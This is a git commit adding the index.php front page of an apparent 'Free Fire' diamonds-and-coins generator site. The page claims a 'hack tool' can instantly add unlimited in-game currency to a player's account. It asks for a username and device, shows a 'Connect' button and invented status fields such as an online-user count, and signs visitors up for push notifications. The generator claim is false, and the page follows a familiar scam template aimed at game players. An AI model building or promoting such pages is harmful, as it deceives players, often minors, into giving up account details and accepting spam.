c2a9951f2b9322f36b9d7096166275a1247cf9d5
AK47-By-Aaryan <71070574+AK47-By-Aaryan@users.noreply.github.com>
2020-09-10 15:36:36 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,272 @@
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+
+	<head>
+
+		<title>Free Fire Generator - Unlimited Diamonds & Coins 2020</title>
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+		<meta name="description" content="Unlimited free fire diamonds instantly into your account, use our free fire hack tool to generate ff diamonds, our free fire generator is secure & super easy to use." />
+
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+		<link rel="icon" type="image/ico" href="img/icon.png" />
+
+		<!-- Open Graph Meta Tags-->
+
+		<meta property="og:title" content="Free Fire Generator - Unlimited Diamonds & Coins 2020" />
+
+		<meta property="og:description" content="Unlimited free fire diamonds instantly into your account, use our free fire hack tool to generate ff diamonds, our free fire generator is secure & super easy to use." />`
+
+		<meta property="og:type" content="website" />
+
+		<meta property="og:url" content="https://gamethunks.net/" />
+
+		<meta property="og:image" content="http://gamethunks.net/img/bg.jpg" />
+
+		<!-- Twitter Meta -->
+
+		<meta name="twitter:card" content="summary" />
+
+		<meta name="twitter:title" content="Free Fire Generator - Unlimited Diamonds & Coins 2020" />
+
+		<meta name="twitter:description" content="Unlimited free fire diamonds instantly into your account, use our free fire hack tool to generate ff diamonds, our free fire generator is secure & super easy to use." />
+
+		<meta name="twitter:image" content="https://gamethunks.net/img/bg.jpg" />
+
+		<!-- Icons -->
+
+		<link rel="stylesheet" href="css/icon-font.min.css">
+
+        <!--<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">-->
+
+		<link rel="stylesheet" href="css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+
+		<!-- Google Fonts -->
+
+		<link href="https://fonts.googleapis.com/css?family=Teko:300,400,700&display=swap" rel="stylesheet">
+
+		<link href="https://fonts.googleapis.com/css?family=Oswald:300,400,700&display=swap" rel="stylesheet">
+
+		<!-- CSS -->
+
+		<link href="css/bootstrap.min.css" rel="stylesheet" />  
+
+		<link href="css/animate.css" rel="stylesheet" />
+
+		<link href="css/magnific-popup.css" rel="stylesheet" />
+
+		<link href="css/style.css" rel="stylesheet" />
+
+	</head>
+
+	<body>		
+
+		<div class="main-wrapper">			
+
+			<div class="main-bg">	
+
+				<header>
+
+					<div class="branding-wrapper">
+
+						<img src="img/logo.png" class="img-fluid logo-img animated bounceIn" alt="free fire diamonds generator Logo" />
+
+					</div>
+
+					<!--<div class="bg-detail-1"><img src="img/bg-detail-1.png" class="img-fluid bg-detail-1" /></div>
+
+					<div class="bg-detail-2"><img src="img/bg-detail-2.png" class="img-fluid bg-detail-2" /></div>-->
+
+				</header>
+
+				<div class="main-content">
+
+					<!--<div class="bg-cover"><img src="img/fifa-20-cover-char.png" class="img-fluid bg-cover-char-img" /></div>-->
+
+					<div class="container">
+
+						<div class="generator-wrapper">
+
+							<div class="generator-header-wrapper">
+
+								<div class="generator-header">
+
+									<h2 class="animated bounceIn animation-delay-200"><span class="h-bottom">Diamonds / Coins Generator</span></h2>
+
+									<div class="generator-status">
+
+										<div class="generator-status-content">
+
+											<div class="status-item-wrapper animated bounceIn animation-delay-400">
+
+												<span class="status-label">Status:</span>
+
+												<span id="status" class="status-dynamic">Online</span>
+
+											</div>
+
+											<div class="status-item-wrapper animated bounceIn animation-delay-600">
+
+												<span class="status-label">Last Update:</span>
+
+												<span id="date" class="status-dynamic"></span>
+
+											</div>
+
+											<div class="status-item-wrapper animated bounceIn animation-delay-800">
+
+												<span class="status-label">Online Users:</span>
+
+												<span id="online-count" class="status-dynamic"></span>
+
+											</div>
+
+										</div>
+
+									</div>
+
+								</div>
+
+							</div>
+
+							<div class="generator-content">								
+
+								<div class="form-wrapper">
+
+									<div class="label animated bounceIn animation-delay-400">Username and Device</div>
+
+									<div class="animated bounceIn animation-delay-600">
+
+										<div class="input-wrapper username-wrapper">
+
+											<img src="img/icon.png" class="input-icon" />
+
+											<input type="text" id="player-username" class="s-input" placeholder="Username..." />
+
+										</div>
+
+									</div>
+
+									<div class="animated bounceIn animation-delay-800">
+
+										<div class="platform-select-wrapper">
+
+											<div class="row small-margin">
+
+												<div class="col-sm-6 col-12 small-padding">
+
+													<div class="platform-item platform-item-1">
+
+														<i class="fab fa-android"></i>
+
+														<span>Android</span>
+
+													</div>
+
+												</div>
+
+												<div class="col-sm-6 col-12 small-padding">
+
+													<div class="platform-item platform-item-2">
+
+														<i class="fab fa-apple"></i>
+
+														<span>IOS</span>
+
+													</div>
+
+												</div>
+
+											</div>
+
+										</div>
+
+									</div>
+
+									<div class="button-wrapper animated bounceIn animation-delay-1000">
+
+										<div id="proc-btn-1" class="s-btn">
+
+											<span>Connect</span>
+
+										</div>
+
+									</div>
+
+								</div>
+
+							</div>
+
+						</div>
+
+					</div>
+
+				</div>
+
+			</div>			
+
+		</div>
+
+		<div class="modal-outer"></div>
+
+		<script type="application/javascript" src="js/app.js" async></script>
+
+		<script>
+
+            var truepush = window.truepush || [];
+
+
+
+            truepush.push(function(){
+
+                truepush.Init({
+
+                    id: "5f093edeb6a34f856745d6f6"
+
+                },function(error){
+
+                    if(error) console.error(error);
+
+                })
+
+            })
+
+		</script>
+
+	</body>
+
+	<!-- JS -->	
+
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+
+	<script type="text/javascript" src="js/jquery.magnific-popup.min.js"></script>	
+
+	<script type="text/javascript" src="js/ion.sound.min.js"></script>	
+
+    <script type="text/javascript" src="js/jquery.countTo.js"></script>
+
+    <script type="text/javascript" src="js/main.js"></script>
+
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-155217642-12"></script>
+
+	<script>
+
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag(){dataLayer.push(arguments);}
+
+        gtag('js', new Date());
+
+
+
+        gtag('config', 'UA-155217642-12');
+
+	</script>
+
+</html>
